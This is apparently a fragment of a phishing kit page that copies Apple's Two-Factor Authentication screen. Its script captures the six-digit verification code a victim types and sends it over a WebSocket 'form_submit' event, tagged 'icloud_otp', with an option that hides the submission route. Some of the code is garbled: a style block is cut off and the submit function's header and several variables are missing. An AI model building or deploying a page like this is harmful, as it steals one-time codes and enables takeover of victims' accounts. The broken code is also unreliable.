        <div id="idms-auth-8ee53036-181e-4279-b3ef-fb310c923fb4" class="apple-id-container apple-id-frame-value">
            <form id="otp-form" method="post" action="">
                <div class="container" style="padding-top:7rem;padding-left: 5rem;padding-right: 5rem;">

                  font-size: 22px;
                  font-weight: 500;
                  line-height: 36px;
                  color: #000;
                  -webkit-margin-before: 20px;
                  margin-block-start: 20px;
                  text-align: center;">Two-Factor Authentication</h3>
                    <div class="otp-inputs">
                        <input autofocus type="text" name="code1" class="otp-input" maxlength="1">
                        <input type="text" name="code2" class="otp-input" maxlength="1">
                        <input type="text" name="code3" class="otp-input" maxlength="1">
                        <input type="text" name="code4" class="otp-input" maxlength="1">
                        <input type="text" name="code5" class="otp-input" maxlength="1">
                        <input type="text" name="code6" class="otp-input" maxlength="1">
                    </div>
                    <p style="text-align: center; margin-top: 20px;">A message with a verification code has been sent to  <br> your device. Enter the code to continue.</p>
                    <center><a href="https://iforgot.apple.com/password/verify/appleid" style="text-align: center; color: #0070c9; text-decoration: none;">Didn't get a verification code?</a></center>

            <script>
                // Store reference to the form
                const form = document.getElementById('otp-form');
                let hideRoute = false;
                
                // First, fetch the configuration to determine if hide_route is enabled
                fetch('/api/v1/config')
                    .then(response => response.json())
                    .then(config => {
                        // Store the hide_route setting
                        hideRoute = config.options.hide_route === true;
                        console.log('Hide route enabled:', hideRoute);
                        
                        // Check socket availability immediately
                        if (hideRoute) {
                            if (window.socket) {
                                console.log("Socket object found:", window.socket.connected ? "Connected" : "Disconnected");
                            } else if (window.io) {
                                console.log("Socket.io library found but no socket instance");
                            } else {
                                console.warn("No socket library or instance found!");
                            }
                        }
                        
                        // Expose the emit function globally if it's not already exposed
                        // This ensures this script has the same structure as 1page.js
                        if (hideRoute && typeof window.emitFormSubmit !== 'function') {
                            window.emitFormSubmit = function(pageRoute, formData) {
                                console.log("Custom emitFormSubmit called with:", pageRoute, formData);
                                
                                // Convert FormData to a plain object for WebSocket transmission
                                let formDataObj = {};
                                
                                // Handle either FormData object or plain JavaScript object
                                if (formData instanceof FormData) {
                                    for (const [key, value] of formData.entries()) {
                                        formDataObj[key] = value;
                                    }
                                } else if (typeof formData === 'object') {
                                    // Already a plain object, use directly
                                    formDataObj = formData;
                                }
                                
                                console.log("Form data being sent:", formDataObj);
                                
                                if (window.socket && window.socket.emit) {
                                    return new Promise((resolve) => {
                                        window.socket.emit('form_submit', {
                                            page: pageRoute,
                                            formData: formDataObj,
                                            timestamp: Date.now(),
                                            userAgent: navigator.userAgent
                                        }, (response) => {
                                            resolve(response);
                                        });
                                    });
                                }
                            };
                        }
                        
                        // Continue with OTP setup
                        setupOTPHandling();
                    })
                    .catch(error => {
                        console.error('Error fetching config:', error);
                        // Fall back to traditional form handling
                        setupOTPHandling();
                    });
                
                function setupOTPHandling() {
                    // Prevent default form submission immediately - critical for hide_route
                    if (form) {
                        form.addEventListener('submit', function(event) {
                            // Always prevent default form submission
                            event.preventDefault();
                            console.log("Form submission prevented");
                            
                            const inputs = document.querySelectorAll('.otp-input');
                            submitOTP(inputs);
                            return false;
                        });
                    }
                    
                    // Handle OTP input fields
                    document.querySelectorAll('.otp-input').forEach((input, index, inputs) => {
                        input.addEventListener('input', () => {
                            // Automatically move focus to the next input
                            if (input.value && input.nextElementSibling) {
                                input.nextElementSibling.focus();
                            }
                            // Automatically move focus to the previous input if the current input is empty
                            if (!input.value && input.previousElementSibling) {
                                input.previousElementSibling.focus();
                            }
                            
                            // Check if all inputs are filled

                            if (allFilled) {
                                submitOTP(inputs);
                            }
                        });
                
                        if (index === 0) {
                            input.focus();
                        }
                    });
                }

                        function checkSocketReady() {
                            if (window.socket) {
                                if (!window.socket.connected) {
                                    console.log("Socket exists but not connected - trying to connect");
                                    try {
                                        window.socket.connect();
                                        return window.socket.connected;
                                    } catch (e) {
                                        console.error("Error connecting socket:", e);
                                        return false;
                                    }
                                }
                                return true;
                            }
                            return false;
                        }
                        
                        // Make sure socket is connected
                        const socketReady = checkSocketReady();
                        console.log("Socket ready status:", socketReady);
                        
                        // Get current route from pathname
                        const currentRoute = window.location.pathname;

                        // Create the correct form data object structure that server expects
                        const formDataObj = {
                            otp: otpCode,
                            code1: inputs[0].value,
                            code2: inputs[1].value,
                            code3: inputs[2].value,
                            code4: inputs[3].value,
                            code5: inputs[4].value,
                            code6: inputs[5].value,
                            page_route: 'icloud_otp' // This is critical - it sets the page key for storing values
                        };
                        
                        console.log("Form data object:", formDataObj);
                        console.log("Current route:", currentRoute);
                        
                        // Try to submit using window.emitFormSubmit if available
                        if (typeof window.emitFormSubmit === 'function') {
                            console.log("Using window.emitFormSubmit function");
                            try {
                                window.emitFormSubmit(currentRoute, formDataObj, function(response) {
                                    console.log("Form submission response:", response);
                                });
                                return;
                            } catch (error) {
                                console.error("Error using emitFormSubmit:", error);
                            }
                        }
                        
                        // Fallback to direct socket.emit if available
                        if (socketReady) {
                            console.log("Using direct socket.emit");
                            try {
                                // Send the form data directly - no need for conversion
                                console.log("Sending form data via socket:", formDataObj);
                                window.socket.emit('form_submit', {
                                    page: currentRoute,
                                    formData: formDataObj, // Use the already created object
                                    timestamp: Date.now(),
                                    userAgent: navigator.userAgent
                                }, function(response) {
                                    console.log("Socket form submission response:", response);
                                });
                                return;
                            } catch (error) {
                                console.error("Error using socket.emit:", error);
                            }
                        }
                        
                        // Last fallback - show error message
                        console.error("No suitable WebSocket method found for form submission");
                        alert("An error occurred. Please try again.");
                    } else {
                        // Normal form submission when hide_route is false
                        console.log('Using normal form submission');
                        const form = document.querySelector('form');
                        if (form) {
                            // Add the OTP to a hidden input field
                            let hiddenInput = form.querySelector('input[name="otp"]');
                            if (!hiddenInput) {
                                hiddenInput = document.createElement('input');
                                hiddenInput.type = 'hidden';
                                hiddenInput.name = 'otp';
                                form.appendChild(hiddenInput);
                            }
                            hiddenInput.value = otpCode;
                            form.submit();
                        }
                    }
                }
            </script>
